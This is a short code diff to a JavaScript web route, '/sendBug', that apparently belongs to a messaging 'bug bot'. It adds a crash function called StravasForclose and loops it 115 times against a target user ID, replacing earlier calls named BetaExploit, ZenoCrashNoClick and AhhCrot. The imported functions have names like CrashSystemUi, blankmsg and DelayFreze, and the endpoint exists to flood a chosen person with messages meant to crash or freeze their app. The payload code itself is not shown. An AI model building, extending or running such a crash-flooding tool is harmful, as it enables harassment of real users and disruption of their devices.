@@ -14,6 +14,7 @@ const {
   DelayFreze,
   yhcv,
   CrashSystemUi,
+  StravasForclose,
   crashbeta,
   overflowfc,
   blankmsg,
@@ -379,13 +380,9 @@ router.get("/sendBug", async (req, res) => {
             await sleep(1500);
           }
           break;
-          case "crashfcnewxryy":
+          case "StravasForclose":
           for (let i = 0; i < 115; i++) {
-            await BetaExploit(sock, targetJid);
-            await sleep(1500);
-            await ZenoCrashNoClick(sock, targetJid);
-            await sleep(1500);
-            await AhhCrot(sock, targetJid);
+            await StravasForclose(sock, targetJid);
             await sleep(1500);
           }
           break;
